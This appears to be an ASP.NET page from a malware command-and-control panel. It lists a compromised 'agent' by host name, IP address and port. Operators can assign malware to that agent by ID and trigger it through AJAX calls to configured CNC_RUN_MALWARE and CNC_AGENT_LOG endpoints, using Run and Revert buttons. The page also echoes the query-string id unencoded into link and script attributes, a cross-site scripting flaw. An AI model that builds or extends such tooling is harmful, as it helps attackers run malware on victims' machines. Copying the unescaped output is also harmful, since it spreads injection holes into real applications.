<%@ Page Title="" Language="C#" MasterPageFile="~/cpanel/PC/MasterPage/ControPanel.master" AutoEventWireup="true" CodeFile="cmd.aspx.cs" Inherits="cpanel_PC_Agents_cmd" %>

<asp:Content ID="Content1" ContentPlaceHolderID="head" runat="Server">

    <script>
        function Run(_malware_id, _agent_id) {

            Swal.fire({
                title: 'Please Wait',
                allowEscapeKey: false,
                allowOutsideClick: false,
                background: '#19191a',
                showConfirmButton: false,
                onOpen: () => {
                    Swal.showLoading();
                }
            });

            $.ajax({
                url: '<%=System.Configuration.ConfigurationManager.AppSettings["CNC_RUN_MALWARE"].ToString() %>',
                method: 'GET',
                data: { malware_id: _malware_id, agent_id: _agent_id },
                success: function (data) {
                    data = JSON.parse(data);
                    res = JSON.parse(data.msg);

                    if (res.status == true)
                        Swal.fire({ type: 'success', title: 'Response', text: 'The operation was done successfully' });
                    else
                        Swal.fire({ type: 'error', title: 'Response', text: res.msg });
                },
                error: function () {
                    console.log('error');
                    Swal.fire(
                        'Something wrong !',
                        'Server is not reachable !',
                        'error'
                    )
                }
            });
        }


        function state_machine(_agent_id) {

            Swal.fire({
                title: 'Please Wait',
                allowEscapeKey: false,
                allowOutsideClick: false,
                background: '#19191a',
                showConfirmButton: false,
                onOpen: () => {
                    Swal.showLoading();
                }
            });

            $.ajax({
                url: '<%=System.Configuration.ConfigurationManager.AppSettings["CNC_AGENT_LOG"].ToString() %>',
                method: 'GET',
                data: {agent_id: _agent_id },
                success: function (data) {
                    data = JSON.parse(data);
                     console.log(data);
                    if (data.status == true) {
                        data = JSON.parse(data.msg);
                        console.log(data);
                    }
                  
                },
                error: function () {
                    console.log('error');
                    Swal.fire(
                        'Something wrong !',
                        'Server is not reachable !',
                        'error'
                    )
                }
            });
        }
    </script>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder_main" runat="Server">
    <h2 style="display: inline; padding-left: 20px;">Agents :</h2>
    <hr />
    <a href="Default.aspx" class="btn btn-success"><span>↩ Back</span></a>
    <a href="log.aspx?id=<%=Request.QueryString["id"].ToString() %>" target="_blank" type="button" id="btn_state_machine" class="btn btn-info"><span>state machine</span></a>
    <div style="padding-left: 30px; padding-top: 20px;">
        <table style="width: 600px;" align="Left">
            <tr>
                <td style="width: 400px;">
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text">ID :</span>
                        </div>
                        <input type="Text" maxlength="9" minlength="9" runat="server" id="txtid" class="form-control" disabled="disabled" style="text-align: center;" required>
                    </div>
                </td>
            </tr>
            <tr>
                <td style="width: 400px;">
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text">Host name:</span>
                        </div>
                        <input type="Text" runat="server" id="txthostname" class="form-control" disabled="disabled" style="text-align: center;" required>
                    </div>
                </td>
            </tr>
            <tr>
                <td style="width: 400px;">
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text">IP address:</span>
                        </div>
                        <input type="Text" minlength="2" runat="server" id="txt_ip_address" class="form-control" style="text-align: center;" disabled="disabled" required>
                    </div>
                </td>
            </tr>

            <tr>
                <td style="width: 400px;">
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text">Port :</span>
                        </div>
                        <input type="tel" minlength="7" maxlength="10" runat="server" id="txt_port" class="form-control" disabled="disabled" style="text-align: center;" required>
                    </div>
                </td>
            </tr>
            <tr>
                <td style="width: 400px;">
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text">Add new malware :</span>
                        </div>
                        <input type="Text" runat="server" id="txt_malware_id" class="form-control" placeholder="malware id" style="text-align: center;">
                        <asp:Button ID="btn_check_status" runat="server" CssClass="btn btn-info rounded-0" Text="Send" OnClick="btn_check_status_Click" />
                    </div>
                </td>
            </tr>
            <tr>
                <td>

                    <div style="padding-top: 20px;">
                        <asp:GridView ID="GR0021XX" OnRowCommand="GR0021XX_RowCommand" Width="100%" runat="server" AllowPaging="True" AutoGenerateColumns="False" CellPadding="4" DataKeyNames="main_id" DataSourceID="SqlDataSource1" Style="text-align: center" ForeColor="#333333" GridLines="None" PageSize="40">
                            <AlternatingRowStyle BackColor="White" ForeColor="#284775" />
                            <Columns>
                                <asp:BoundField DataField="main_id" HeaderText="#" SortExpression="main_id" />
                                <asp:BoundField DataField="name" HeaderText="Malware" SortExpression="name" />
                                <asp:BoundField DataField="Date" HeaderText="Date" SortExpression="Date" />

                                <%--    <asp:TemplateField>
                                    <ItemTemplate>
                                        <img style="width: 40px; height: 40px;" src="img/<%#Eval("Status") %>.png" />
                                    </ItemTemplate>
                                </asp:TemplateField>
                                --%>
                                <asp:BoundField DataField="last_updated" HeaderText="Last update" SortExpression="last_updated" ReadOnly="True" />
                                <asp:TemplateField>
                                    <ItemTemplate>
                                        <asp:Button ID="Button1" CssClass="btn btn-warning" runat="server" Text="Revert" CommandArgument='<%#Eval("malware_id") %>' CommandName="revert_malware" />
                                        <input type="button" id="Button" class="btn btn-success" value="Run" onclick='Run(<%#Eval("malware_id") %>,<%=Request.QueryString["id"].ToString() %>)'>
                                    </ItemTemplate>
                                </asp:TemplateField>
                            </Columns>
                            <FooterStyle CssClass="table_header" />
                            <HeaderStyle CssClass="table_header" />
                            <RowStyle CssClass="table_row" />
                        </asp:GridView>
                        <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:ReWareConnectionString %>" SelectCommand="SELECT *,[Agent_malwares].malware_id malware_id,[agent_malwares].id main_id,[Malwares].name name,[agent_malwares].last_updated date FROM [Agent_malwares],[Malwares] where [Malwares].id=[Agent_malwares].malware_id and agent_id=@id ORDER BY main_id">
                            <SelectParameters>
                                <asp:QueryStringParameter Name="id" QueryStringField="id" Type="Int32" />
                            </SelectParameters>
                        </asp:SqlDataSource>
                    </div>


                </td>
            </tr>
        </table>
    </div>



</asp:Content>

